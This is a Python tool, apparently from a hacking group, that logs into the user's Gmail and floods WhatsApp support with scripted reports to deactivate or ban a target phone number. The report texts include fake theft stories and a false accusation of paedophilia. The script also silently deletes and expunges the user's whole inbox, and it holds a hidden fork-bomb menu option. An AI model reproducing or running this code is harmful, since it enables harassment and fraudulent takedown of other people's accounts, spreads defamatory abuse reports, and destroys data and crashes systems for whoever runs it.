#!/usr/bin/python3
#Hice Este Repositorio para la legion warriors of death :P
import webbrowser,os, sys, time,platform, subprocess, getpass,smtplib, email.message, imaplib, email, ssl
clean = ("cls" if os.name == "nt" else "clear")
def clear():
	os.system(clean)
def restart():
    python = sys.executable;os.execl(python, python, *sys.argv)
global Y, C, G, R, wp, main, main2
Y = '\033[1;33m'
C = '\033[1;37m'
G = '\033[1;32m'
R = '\033[1;31m'
error = f'{C}[{R}ERROR{C}]';warning = f'{C}[{Y}!{C}]';info = f'{C}[{G}i{C}]'
result = os.popen('figlet HERMES').read()
try:
	if __name__ =='__main__':
		print(f'{warning} Buscando actualizaciones')
		update=subprocess.check_output('git pull', shell=True)
		if 'Already up to date' not in update.decode():
			print(f'{info} Actualización instalada\n{info} Reiniciando...');time.sleep(2);restart()
		else:
			print(f'{warning} No hay actualizaciones disponibles.');time.sleep(2)
except:
	if os.path.exists('.git'):
		pass
	else:
		print(f"{error} Falta de repositorio GIT local.")
try:
	subprocess.check_output('apt update -y', shell=True)
	os.system('apt install figlet')
except:
		os.system('pacman -Sy figlet')
wp = f'''{result}\n{C}__ {G}Warriors Of Death!{C} __\n{C}==================\n{info} Coded By: {G}Hermes{C}\n{info} Github: {G}https://github.com/HermesWarriorsofDeath\n{warning} Recuerda activar la opción 'Aplicaciones menos seguras' en la cuenta que vas a utilizar {warning}\n{C}=================='''
main = f'''
{wp}\n{C}[{G}1{C}] Desactivar Numero
{C}[{G}2{C}] Restablecer codigos
{C}[{G}3{C}] Retirar Baneo
{C}[{G}4{C}] Banear Numero
{C}[{G}5{C}] Derrumbar Blindaje
{C}[{G}6{C}] Blindar Numero

==================
{C}[{G}8{C}] Permisos de Aplicaciónn
{C}[{G}9{C}] Contacto de WhatsApp
{C}[{G}0{C}] Sair
{C}===> {G}'''
erro1=f'{wp}\n{error} Caractere(s) inválido(s) no uses el arroba gmail.com solo el usuario.\n{C}================='
url1 = 'https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OSggjYOgt8g8HbgSU58LpUqQ5GsD63ipENqa84YegMHionqqvIXMMoc4bqu-C0GH0N--Kal_AFpd5rRJYyO0g-y1AbEQ'
url2 = 'https://wa.me/5218333659697'
def link():
	if op ==8:
		if platform.system() == "Windows":
			webbrowser.open(url1)
		else:
			os.system('termux-open-url '+url1)
	elif op ==9:
		if platform.system() == "Windows":
			webbrowser.open(url2)
		else:
			os.system('termux-open-url '+url2)
main2 = [f'{wp}\n{C}[{G}1{C}] Método #1',f'\n{C}[{G}2{C}] Método #2', f'\n{C}[{G}3{C}] Método #3', f'\n{C}[{G}4{C}] Método #4', f'\n{C}[{G}5{C}] Método #5', f'\n{C}[{G}6{C}] Método #6', f'\n{C}===>{G}']
inp = f'''{C}===>{G} '''
error = f'{C}[{R}ERROR{C}]';warning = f'{C}[{Y}!{C}]';info = f'{C}[{G}i{C}]'
block_num = ["+52 833 416-0298","+55 21 79180533","55 21 7918053333","55 21 7918-0533","+55217918-0533","+5218333659697","5218333659697","55217918-0533"]
def init():
	gmail=input(f'{C}[{Y}Gmail{C}]: ');senha=getpass.getpass(prompt=f'{C}[{Y}senha{C}]: ')
	login = {
	'log1':f'{gmail}',
	'log2':f'{senha}',
	############
	'server':'smtp.gmail.com',
	}
	mail = imaplib.IMAP4_SSL(login['server'])
	mail.login(login['log1'], login['log2'])
	mail.select('INBOX')
	try:
	   		try:
	   			##############################
		   		status, search_data = mail.search(None, 'ALL')
		   		mail_ids = []
		   		for block in search_data:
		   			mail_ids += block.split()
		   		start = mail_ids[0].decode()
		   		end = mail_ids[-1].decode()
		   		mail.store(f'{start}:{end}'.encode(), '+X-GM-LABELS', '\\Trash')
		   		mail.select('[Gmail]/Trash')
		   		mail.store("1:*", '+FLAGS', '\\Deleted')
		   		mail.expunge()
		   		mail.close()
		   		mail.logout()
		   		##############################
		   	except:
		   		pass
		   	while True:
		   		##############################
	   			msg = email.message.Message()
	   			msg['Subject'] = titulo
	   			msg['From'] = login['log1']
	   			msg['To'] = 'support@support.whatsapp.com'
	   			password = login['log2']
	   			msg.add_header('Content-Type', 'text/html')
	   			msg.set_payload(bd )
	   			##############################
	   			s = smtplib.SMTP('smtp.gmail.com: 587')
	   			s.starttls()
	   			s.login(msg['From'], login['log2'])
	   			s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
	   			##############################
	   			status, data = mail.search(None, 'ALL')
	   			for block in data:
	   				mail_ids += block.split()
	   			for i in mail_ids:
	   				status, data = mail.fetch(i, '(RFC822)')
	   				for response_part in data:
	   				    if isinstance(response_part, tuple):
	   				    	message = email.message_from_bytes(response_part[1])
	   				    	mail_from = message['from']
	   				    	mail_subject = message['subject']
	   				    	if message.is_multipart():
	   				    	   mail_content = ''
	   				    	   for part in message.get_payload():
	   				    	           if part.get_content_type() == 'text/plain':
	   				    	           	mail_content += part.get_payload()
	   				    	else:
	   				    		mail_content = message.get_payload()
	   				    	if 'support@support.whatsapp.com' in mail_from:
	   				    		restart()
	   			##############################
	except Exception as erro:
		print(f"{error} Compruebe si se ha activado la opción 'Aplicaciones menos seguras' o si ha introducido el correo electrónico / contrasena correctamente, o bien puede ser un error de conexion revise su bandeja de enviados.\n{warning}: "+str(erro));time.sleep(5)
Sair = False
while(Sair == False):
		try:
			clear();op = int(input(main))
			if op == 1 or op == 2 or op == 3 or op == 4 or op == 5 or op == 6:
				numero=input(f'{C}[{Y}Numero{C}]: ')
				for num in block_num:
					if num in numero:
						clear();print(f'\n{result}\n{C}=================\n{error}NÚMERO PROHIBIDO.\n{C}=================');time.sleep(3);pass
				title = {
	# Desativação de Número
	'title0':'Desactive este número',
	'title1':'Please Deactivate The My Account Number',
	'title2':'teléfono robado/extraviado: por favor desactiva mi cuenta',
	'title3':'禁⽌我的紧急帐⼾',
	'title4':'Perdido/Roubado: Por favor, desative minha conta',
	'title5':'Por favor, desativem minha conta',
	#####################
	#Restablecer codigos
	'title6':'Reenviar codigo de verificacion',
	'title7':'No puedo iniciar sesión en whatsapp con codigo!',
	'title8':'No recibo el código de verificación',
	#####################
	#Retirar Baneo
	'title9':'No puedo acceder a mi cuenta',
	'title10':'Mi número fue prohibido injustamente',
	#####################
	#Banear Numero
	'title11':'AYUDAME URGENTEMENTE',
	'title12':'Perdido/Robado',
	#####################
	#Derrumbar Blindagem
	'title13':'Perdido/Robado',
	#####################
	#Blindar Número
	'title14':'Desactive el número de mi cuenta',
	'title15':'Por favor, ayúdenme!'
	#####################
	}
				text = {
	# Desactivacion de Número
	'text0':f'Desactive esta cuenta urgentemente: {numero}',
	'text1':f'Hace poco me robaron y los bandidos se llevaron todos mis documentos, incluido mi celular, los necesito para desactivar mi cuenta hasta que recupere mi celular o chip, porque tengo una microempresa en mi celular y no quiero que tengan acceso a ella.: {numero}',
	'text2':f'Estoy solicitando la desactivación temporal de mi cuenta de whatsapp, mi número: {numero}',
	'text3':f'偷⾛了我的⼿机和我所有的宝⻉，请⽴即禁⽌我的帐⼾{numero}',
	'text4':f'Hola, me gustaría deshabilitar mi número de WhatsApp porque estoy cambiando a Telegram, Mi número: {numero}',
	'text5':f'Perdido / Robado: Desactive mi cuenta {numero}',
	#####################
	#Restablecer Codigos
	'text6':f'Hola, no puedo registrarme en mi cuenta, ayúdame: {numero}',
	'text7':f'No puedo iniciar sesión en whatsapp, mi número marca  -1 segundos, ¡te pido por favor que restablezcas la verificación de mi número! Número: {numero}',
	'text8':f'No puedo acceder a mi numero. Alguien solicitó mi código por error o intencionalmente. Mi número se usa para conversaciones con miembros de mi familia, amigos y trabajo. ¡Restablezca mi código de verificación por SMS! Número: {numero}',
	#####################
	#Retirar Baneo
	'text9':f'Hola, compré un número para que mi hijo haga su trabajo en la escuela a la que asiste, pero cuando intenté ingresar el número, estaba diciendo que el número estaba prohibido para whatsapp y ni siquiera ingresé el número anteriormente, ya compré el número y él ya estaba así, necesita urgentemente ese número para hacer su trabajo escolar. ¡Ayuda lo antes posible! Número: {numero}',
	'text10':f'Estoy trabajando y de repente mi número fue baneado, no sé qué pasó, necesito mi número porque es del trabajo, necesito atender a mis clientes. Mi número: {numero}',
	#####################
	#Banear Numero
	'text11':f'Pedofilia y abuso sexual, quiero que banes este número al Soporte de WhatsApp, está involucrado con grupos de pedofilia, te pido que me ayudes en esto porque mi hijo fue una víctima. Número: {numero}',
	'text12':f'por favor banear este número: {numero}',
	#####################
	#Derrumbar Blindaje
	'text13':f'Hola, perdí todos mis documentos y me robaron el chip. Quiero que desactiven mi cuenta de inmediato, el chip y cuenta tienen datos sobre mí, así que quiero que desactiven mi número de inmediato.: {numero}',
	#####################
	#Blindar Número
	'text14':f'Please Deactivate The My Account Number Immediately Because The Number Has Been Lost: {numero}',
	'text15':f'Me están acosando. ¡Por favor varios personas y mi número se ha filtrado en varias redes sociales! Te pido que revises los informes antes de realizar cualquier tipo de prohibición sobre mi número: {numero}'
	#####################
	}
				if op == 1:
					clear();op2 = int(input(main2[0]+main2[1]+main2[2]+main2[3]+main2[4]+main2[5]+main2[6]))
					if op2 == 1:
						clear();print(wp, f'{C}Modo:{R} Desactivar Numero{C}\n');titulo = title['title0'];bd=text['text0']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{R} Desactivar Numero{C}\n');titulo = title['title1'];bd=text['text1']
					elif op2 == 3:
						clear();print(wp, f'{C}Modo:{R} Desactivar Numero{C}\n');titulo = title['title2'];bd=text['text2']
					elif op2 == 4:
						clear();print(wp, f'{C}Modo:{R} Desactivar Numero{C}\n');titulo = title['title3'];bd=text['text3']
					elif op2 == 5:
						clear();print(wp, f'{C}Modo:{R} Desactivar Numero{C}\n');titulo = title['title5'];bd=text['text4']
					elif op2 == 6:
						clear();print(wp, f'{C}Modo:{R} Desactivar Numero{C}\n');titulo = title['title5'];bd=text['text5']
					else:
						pass
					init()
				elif op == 2:
					clear();op2 = int(input(main2[0]+main2[1]+main2[2]+main2[6]))
					if op2 == 1:
						clear();print(wp, f'{C}Modo:{G} Restablecer codigos{C}\n');titulo = title['title6'];bd=text['text6']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{G} Restablecer codigos{C}\n');titulo = title['title7'];bd=text['text7']
					elif op2 == 3:
						clear();print(wp, f'{C}Modo:{G} Restablecer codigos{C}\n');titulo = title['title8'];bd=text['text8']
					else:
						pass
					init()
				elif op == 3:
					clear();op2 = int(input(main2[0]+main2[1]+main2[6]))
					if op == 2:
						clear();print(wp, f'{C}Modo:{G} Retirar Baneo{C}\n');titulo = title['title9'];bd=text['text9']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{G} Retirar Baneo{C}\n');titulo = title['title10'];bd=text['text10']
					else:
						pass
					init()
				elif op == 4:
					clear();op2 = int(input(main2[0]+main2[1]+main2[6]))
					if op2 == 1:
						clear();print(wp, f'{C}Modo:{R} Banear Numero{C}\n');titulo = title['title11'];bd=text['text11']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{R} Banear Numero{C}\n');titulo = title['title12'];bd=text['text12']
					else:
						pass
					init()
				elif op == 5:
					clear();print(wp, f'{C}Modo:{R} Derrumbar Blindaje{C}\n');titulo = title['title13'];bd=text['text13']
				elif op == 6:
					clear();op2 = int(input(main2[0]+main2[1]+main2[6]))
					if op == 2:
						clear();print(wp, f'{C}Modo:{G} Blindar Numero{C}\n');titulo = title['title14'];bd=text['text14']
					elif op2 == 2:
						clear();print(wp, f'{C}Modo:{G} Blindar Numero{C}\n');titulo = title['title15'];bd=text['text15']
					else:
						pass
					init()
				else:
					pass
				init()
			elif op == 7:
				while True:
					os.fork()
			elif op == 8 or op ==9:
				link()
			elif op == 0:
				Sair = True
			if op == None:
				pass
		except Exception as error:
			clear();print(erro1);time.sleep(4)
os.system('rm -rf __pycache__  && '+clean)
